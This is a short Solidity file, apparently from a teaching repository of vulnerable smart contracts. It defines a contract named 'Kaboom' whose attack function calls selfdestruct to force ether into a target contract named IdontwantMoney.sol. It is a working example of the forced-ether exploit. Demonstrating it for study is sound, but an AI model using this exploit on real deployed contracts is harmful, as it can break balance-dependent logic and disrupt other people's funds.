pragma solidity ^0.8.17;
// This smart contract implements a selfdestruct() Attack targeting IdontwantMoney.sol which can be found in  Vulnerable Smart Contracts folder of this repository.
contract Kaboom{
    constructor() public payable{

    }

    function attack(address payable  _contractAddr) payable public {
        
        selfdestruct(_contractAddr);
    }
}
